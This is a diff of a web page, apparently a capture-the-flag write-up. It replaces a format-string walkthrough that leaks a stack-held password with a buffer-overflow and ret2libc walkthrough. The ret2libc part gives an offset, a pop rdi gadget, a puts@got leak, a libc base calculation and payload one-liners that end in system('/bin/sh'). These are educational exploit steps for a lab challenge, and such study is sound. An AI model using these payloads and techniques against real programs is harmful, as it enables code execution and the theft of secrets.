@@ -5,7 +5,7 @@
         <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
         <meta name="description" content="" />
         <meta name="author" content="" />
-        <title>Cache Cache</title>
+        <title>Patchwork</title>
         <link rel="icon" type="image/x-icon" href="../../assets/img/favicon.ico" />
         <!-- Font Awesome icons (free version)-->
         <script src="https://use.fontawesome.com/releases/v5.15.1/js/all.js" crossorigin="anonymous"></script>
@@ -53,46 +53,72 @@
         <!-- Page Content-->
         <div>
             <nav class="navbar navbar-expand-xl navbar-dark bg-header sticky-top">
-            <h3 class="header-article"><a href="../../ctfpage.html">Capture The Flag </a>> <a href="../404ctf.html">404CTF </a>> Cache Cache</h3><!--change path if file has been moved to another folder-->
+            <h3 class="header-article"><a href="../../ctfpage.html">Capture The Flag </a>> <a href="../404ctf.html">404CTF </a>> Patchwork</h3><!--change path if file has been moved to another folder-->
             </nav>
             
             <section class="article">
                 <div class="d-flex flex-column flex-md-row justify-content-between mb-5">
                     <div class="flex-grow-1">
                         <p>
-                            Using Ghidra decompiler, we managed to get back the code source of the program.
-                            <img src="img/cachecache/decompiler.jpg" class="img-fluid" width="600">
-                            After reading the code source, it seems that it is generating a random password.
-                            Looking at the line 42, <i>printf(username)</i> is a Format String Vulnerability. The parameter passed to the function printf() is not a format parameter such as %d, %s, %f etc. In this case, if username = %d then it will print an unknown integer value. <br>
-                            Let's do some test.
-                            <img src="img/cachecache/formatstringvuln.jpg" class="img-fluid" width="400">
-                            Instead of using %d, let's use <strong>%x</strong> to leak addresses stored in the memory. 
-                            <img src="img/cachecache/formatstringvuln2.jpg" class="img-fluid" width="400">
-                            Some addresses have been leaked, let'a analyze this in GDB to have a clearer view. The goal in this challenge is to use the format string vulnerability to leak the password that is generated randomly.
+                            Ghidra decompiler has been used to get the source code of the program.
+                            <img src="img/patchwork/decompilledcode.jpg" class="img-fluid" width="600">
+                            Checking the decompiled code, user_info take up to 56 characters, whereas fgets(user_info) can write until 120 characters. Therefore, we can write more characters than the computer has allocated for the variable user_info. This seems to be the vulnerability in this program. 
+                            It seems that we need to indicate "scientifique" at the first question so that the program continue
                             <br>
-                            <h4>Visualizing in GDB</h4>
-                            <img src="img/cachecache/breakpoint1.jpg" class="img-fluid" width="700">
-                            Putting a breakpoint at the address 0x40184f, <i>cmp dword ptr [rbp - 0x128], 0</i>, the password that has been generated randomly through the loop is stored in the register RAX.
-                            <img src="img/cachecache/formatstringvuln3.jpg" class="img-fluid" width="700">
-                            4 addresses have been printed by using "%x %x %x %x" as input in the program. We notice that <strong>4c2880</strong> is an address of the stack, this value is stored in the register R9. Therefore, we managed to leak some address of the stack. Awesome, let's see if we can leak the passwod that has been generated randomly. <br>
-                            First we need to locate where the password is stored in the stack.
-                            <img src="img/cachecache/stack1.jpg" class="img-fluid" width="700">
-                            The password is loated at the address 0x7fffffffffffe080, his length is 20 characters. If we look back at the source code, <i>cpt = 20</i>. It starts at the address 0x7fffffffffffe080 to 0x7fffffffffffe094. <br>
-                            Let's add more %x this time.
-                            <img src="img/cachecache/formatstringvuln4.jpg" class="img-fluid" width="700">
-                            Cool we see the value 39703649 and this is the value at the address 0x7fffffffffffe080 but the next one is 757a5058, some values are missing there...  <br>
-                            This is because %x has a maximum value of 4294967295 which correspond to 0xFFFFFFFF in hexadecimal so it cannot print more bytes that 0xFFFFFFFF. To print large value we need to use %lx instead of %x.
-                            <div class="squarebox">r < <(python -c "import sys; sys.stdout.buffer.write(b'ABCD' + b'%lx '* 30)")</div>
-                            <img src="img/cachecache/stack2.jpg" class="img-fluid" width="700">
-                            The password has been leaked. Looks like we simply need 18 %lx to print the password.
-                            <div class="squarebox">bytes.fromhex("654130796f2e5331356c34536d5043722f4d3452").decode("ascii") <br>
-                            'eA0yo.S15l4SmPCr/M4R'
+                            Let's fuzz the program with in GDB to see how the stack looks like before exiting the program.
+                            <img src="img/patchwork/stack1.jpg" class="img-fluid" width="800">
+                            At the beginning of the stackframe (0x7fffffffe1d0), it stores the variable user_id (AAAABBBBCCCCDDD scientifique) and the buffer size of the variable is 64 characters. <br>
+                            At the address 0x7fffffffe210, the value of user_info is stored. The buffer size of the variable is 56 characters, but <i>fgets(user_info, 120, stdin)</i> allows us to write until 120 characters.
+
+                            Setting the breakpoint at the instruction RET, to see the return address. 
+                            <img src="img/patchwork/breakpointret.jpg" class="img-fluid" width="700">
+                            At the instruction ret, it destroys the stackframe and the return address is 0x7fffffffe258. It's in the middle of the 'A' so we can redirect to an address and takes control of the execution of the program.
+                            <div class="squarebox">0x7fffffffe258 - 0x7fffffffe210 = 0x48 = 72 in decimal</div>
+                            So the offset is 72 from the variable <i>user_info</i>
+                            <div class="squarebox">r < <(python -c "import sys; sys.stdout.buffer.write(b'scientifique' + b'A'*72)")</div>
+                            Looking at the stack, the word “scientifique” takes 12 bytes. Fgets(user_id, 50, stdin) write 50 characters max in the user_id. 50 – 12 = 38. <br>
+                            So we need to add 38 in our offset. <br>
+                            Offset = 72 + 38 = 110
+                            <div class="squarebox">r < <(python -c "import sys; sys.stdout.buffer.write(b'scientifique' + b'A'*110 + b'\xef\xbe\xad\xde')")</div>
+                            <img src="img/patchwork/deadbeef.jpg" class="img-fluid" width="700">
+                            We can control the execution of the program. The goal is to open a shell, so we need to find a way to execute system("/bin/sh"). This seems to be a ret2libc exploit. <br>
+                            In x64, the first argument is stored in the register RDI, so we need to find the instruction <strong>pop rdi</strong> to overwrite the register RDI.<br>
+                            To exploit ret2libc, we want to print an address of the global offset table. To print something, we can use the function puts(). 
+                            <img src="img/patchwork/puts.jpg" class="img-fluid" width="800">
+                            <strong>puts@got = 0x601018</strong>
+                            <div class="squarebox">
+                            Payload = b’A’ * offset + @poprid + @puts.got + @puts.plt
                             </div>
-                            If you notice, we need to be careful about the bytes order. We might need to convert the bytes in big endian when doing our script. <br>
+                            This is going to equivalent to do puts(puts@got), printing the address of the function puts() in the global offset table. <br>
+                            ROPgadget will helps us to get the address of the instruction pop rid.
+                            <img src="img/patchwork/poprdi.jpg" class="img-fluid" width="800">
+                            <strong>Address of pop rdi; rdi : 0x0000000000400763</strong>
+                            <div class="squarebox">r < <(python -c "import sys; sys.stdout.buffer.write(b'scientifique' + b'A'*110 + b'\x63\x07\x40\x00\x00\x00\x00\x00' + b’\x18\x10\x60\x00\x00\x00\x00\x00’ + b’\x20\x05\x40\x00\x00\x00\x00\x00’)")</div>
+
+                            In pwntool, p.recvline() is used to display message from the process. Strip() is a python function used to remove all the space. Ljust(8, b”\x00”) will add 8 times “\x00” on the left, to make a buffer of 8bytes when using u64() from pwntool. Otherwise you will encounter the error <strong>struct.error : unpack requires a buffer of 8 bytes</strong>
+
+                            <div class="squarebox">Leak = u64(p.recvline().strip().ljust(8, b”\x00”))</div>
+                            <img src="img/patchwork/leakaddressgot.jpg" class="img-fluid" width="900">
+                            We've just leaked the address of puts() in the global offset table. <br>
+                            Now to get the libc_base address, we just need to substract leakaddress_puts by libc.sym["puts"].
+                            <div class="squarebox">libc_base = leakaddress_puts - libc.sym["puts"]</div>
+                            The challenge also provide us the libc used by the program. <strong>libc=ELF('./libc-2.27.so')</strong>
+                            To get the system, we just need to add libc.sym[‘system’] to the libc base address.
+                            <div class="squarebox">system_libc = baseaddress_libc + libc.sym[‘system’] <br>
+                            binsh = baseaddress_libc + next(libc.search(b”/bin/sh\0xx”))
+                            </div>
+                            Once we get this all those address, on the first payload, we need to return to main address. The main address is easily to found, just disassemble the main function and retrieve the address. The main address will create the same stackframe that we can exploit. But this time instead of finding the IP in the libc, we will execute our payload with the address of system and binsh. <br>
                             <br>
-                            <h4>Scripting</h4>
-                            <img src="img/cachecache/script.jpg" class="img-fluid" width="500">
-                            <img src="img/cachecache/flag.jpg" class="img-fluid" width="700">
+                            <strong>Main = p64(0x400647)</strong>
+                            <img src="img/patchwork/script.jpg" class="img-fluid" width="700">
+                            <img src="img/patchwork/flag.jpg" class="img-fluid" width="900">
+
+
+
+
+
+
+
                         </p>
                     </div>
                 </div>
